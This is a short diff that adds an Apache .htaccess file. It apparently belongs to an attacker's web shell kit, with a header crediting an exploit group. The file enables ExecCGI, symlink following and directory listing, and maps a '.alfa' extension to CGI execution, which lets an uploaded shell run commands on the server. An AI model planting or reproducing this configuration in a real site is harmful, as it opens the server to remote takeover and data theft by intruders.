@@ -1,0 +1,4 @@
+#Coded By We Live Together To Exploit Forever
+Options FollowSymLinks MultiViews Indexes ExecCGI
+AddType application/x-httpd-cgi .alfa
+AddHandler cgi-script .alfa
